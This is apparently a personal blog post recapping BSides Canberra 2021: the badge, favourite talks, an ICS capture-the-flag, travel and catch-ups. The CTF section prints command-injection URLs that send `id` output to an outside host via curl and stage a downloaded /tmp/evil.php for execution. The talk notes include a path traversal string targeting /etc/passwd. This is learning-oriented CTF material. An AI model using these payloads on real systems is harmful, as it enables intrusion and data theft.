---
layout: post
date: 2021-04-10
categories: ['life']
published: true
title: Bsides Canberra 2021
---

## A change in perspective :cowboy_hat_face:
It really is a surreal experience attending the conference from the standpoint of someone who is currently working in the industry.  

![ctf-go-brrrrrrrt](/assets/images/bsides21-ctfroom.jpg)  
Only a few years ago, I was the penultimate-year uni student who was trying to prove their worth in a rapidly advancing industry.

Now that I have finally set foot in it, there is a feeling of calmness --- :wind_chime:

Instead of focusing on maximizing the value gained from the conference :disappointed_relieved:  
I decided this time to just catchup with old friends instead :beers:  

<br/>

## The badge :beginner:

Honestly? I never inspected the badge contents once during the conference.  
Not even now, as I'm writing this one week post-conference.  

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">A big shout out to the volunteers at <a href="https://twitter.com/PentenCyber?ref_src=twsrc%5Etfw">@PentenCyber</a> who fought through a busy time at work and a global parts shortage to deliver the <a href="https://twitter.com/BSidesCbr?ref_src=twsrc%5Etfw">@BSidesCbr</a> badge to the community with the support of our friends at GME and <a href="https://twitter.com/4design_news?ref_src=twsrc%5Etfw">@4design_news</a> to make the badge in Sydney <a href="https://twitter.com/hashtag/madeinaustralia?src=hash&amp;ref_src=twsrc%5Etfw">#madeinaustralia</a> <a href="https://t.co/PNAffZt17R">pic.twitter.com/PNAffZt17R</a></p>&mdash; Penten (@PentenCyber) <a href="https://twitter.com/PentenCyber/status/1380289053120024580?ref_src=twsrc%5Etfw">April 8, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 

> If you were involved in the badge making team, I respect all the blood,sweat and tears you've put in. But seriously, the design is not ergonomic or intuitive at all!

I definitely wasn't alone in this opinion as well:
- The badge was heavy and clunky compared to previous years
- The on switch _(yes you read that right)_ couldn't be reached with your bare hands as it was indented into the badge

Then again, I am probably just a whiny pentester who doesn't know shit about hardware hacking and thus can't appreciate the full value of the badge. :man_shrugging:  
This [blog post](https://mosandboo.com/bsides-cbr-2021-badge-hacking-part-1/){:target="_blank"} looks cool though!

<br/>

## The talks :speaking_head:

Here are the talks that I was most interested in:
[\[Scroll til **"Main Track"**\]](https://web.archive.org/web/20210401021357/https://www.bsidesau.com.au/speakers.html){:target="_blank"}  
some I watched; others I'll have to wait til the recording comes out... 

|Title | Author(s) | Why I watched/will watch|
|:-----|:----------|:--------------------------|
|:biohazard: The <br/>Security<br/> of <br/>Emojis :biohazard:|Adrian Justice|Thought it would be interesting, turned out it was a funny (but filler) presentation, still a good watch and reinforces the ideal of always challenging developers' assumptions|
|Easy LPEs and <br/>common software <br/>vulnerabilities|Christopher Vella|Haven't watched yet but heard its good, especially for those heading down the vuln research path!|
|The defender's new clothes|Eldar Marcussen|(see below)|
|13 Nagios Vulnerabilities, <br/>#7 will SHOCK you!|Samir Ghanem|(see below)|
|Context Aware Content Discovery: The Natural Evolution|Assetnote|(see below)|
|Understanding Real Threats for <br/>Real Security|Shane Hutley|Haven't watched yet but recommended by few other people so will watch|
 
<br/>  

#### My takeaways :alembic:  

<u>The defenders new clothes</u>:
- I really enjoyed Eldar's casual style of presentation, as though he is simply talking to himself on stage :snowflake: :cucumber:  
- The interesting tadeoff between using string-based pattern matching and regex-based pattern matching in WAFs:
  - One brings the risk of WAD Denial of Service due to rmalicious regex
  - The other has an inherent risk of false negatives ie. bypasses  
- Using a few of his tools: [`travesty`](https://github.com/wireghoul/traversty){:target="_blank"}, [`PHP-omelette`](https://github.com/wireghoul/php-omelette){:target="_blank"} and so on... its possible to bypass WAFs or detection tools
- Never underestimate the power of a good `//.///..//..///..///etc/passwd` :wink:

<u>NagiOS vulnerabilities</u>:
- It gives me hope that vuln research is still alive and kicking, and that I should really get into it sometime!
- Never make assumptions about how the security of applications, despite the reputation of an org
- I really should look at NagiOS or other similar products to find CVEs in...

<u>Context Aware Asset Discovery</u>:
- I really love what AssetNote is doing at the moment, even though they are a small team, they are creating tools that larger firms would not be able to produce
- I think its also largely due to their business model being innovative and pushing the boundaries of what we think is possible
- What really makes them amazing is they care about the infosec community and always open source their tools and data for everyone to use, which is really heartwarming to say the least :blush:
- Big props to @sean who spent two months researching and building Kiterunner, I can see it being used as part of API testing in legit jobs, as well as by bounty hunters to find more obscure endpoints!!! Truly a great gift to all web-based researchers out there :gift:  

<br/>

---

<br/>


## Industrial Control Systems (ICS) CTF :factory:

I decided to play in this one because it was a good refresher exercise for OSCP/HTB-style challenges which resemble real-world scenarios:

> Long-story-short: After playing, failing, and ultimately running out of time,  I learnt the following new techniques:  :bulb:

<u>WordPress challenge:</u>
- When using `WPScan`, sometimes it might be worth using **_aggresive mode_** or you might miss the one plugin you need for the foothold

<u>Command Injection challenge:</u>
- Apparently you can actually abuse the `-p pattern` in `ping` command during command injection to exfiltrate 16 bytes of data at a time :sparkles:
- Instead of trying to execute commands within the command itself, ie:
  ```bash
  http://172.19.4.44/cgi-bin/device.cgi?command=ping&targetip=$(curl%2010.19.0.205?`id`)
  ```  

  One could instead opt to execute a staged-payload of sorts, <br/>to avoid triggering filters/detections:
  ```bash
  http://172.19.4.44/cgi-bin/device.cgi?command=ping&targetip=$(curl%2010.19.0.205/data.txt%20>%20/tmp/evil.php)
  http://172.19.4.44/cgi-bin/device.cgi?command=ping&targetip=$(chmod%20711%20/tmp/evil.php)
  http://172.19.4.44/cgi-bin/device.cgi?command=ping&targetip=$(php%20/tmp/evil.php)
  # Altogether in three steps: curl 10.19.0.205/data.txt > evil.php; chmod 711 /tmp/evil.php; php /tmp/evil.php
  ```






<br/>


## My accomodation :hotel:

- Thanks Privasec for paying for the hotel!
  - The room was much larger than I expected, almost like an apartment!
  - they even had a pool (I swam in it as well one night :swimming_man:)  
  - It came with a kitchen setup which is great as I could prepare meals

![pool](/assets/images/bsides21-pool.jpg)

<br/>

## Sydney :repeat: Canberra flights :airplane:

Again, thanks Privasec for sponsoring my to/fro flights :grin:
This was my first time taking a plane from Sydney to Canberra:
- I felt like I waited at the airport (starting from gate opening) longer than the flight itself!
- 30 mins for everyone to board and take off, another 30 mins in the air
- It was a **QantasLink Dash 8 Q400** airplane, with propellers on each side and only two seats per side :hushed: 

![dash-flight](/assets/images/bsides21-dash.jpg)

<br/>

## Catchups/New friendships :busts_in_silhouette:

It was great to catch up with all my friends from various places such as:
- UNSW Security Society
- current Privasec colleagues
- ex-HackLabs colleagues
- ex-Pure Security colleagues
- other connections from Sydney/Melbourne

I also met new people from other penetration testing firms and also other student societies!  

Also, I played this game at the Token Barcade and it was quite fun:  

{:refdef style="text-align: center;"}
![buckhunt](/assets/images/bsides21-buckhunt.jpg)
{:refdef}
<br/>



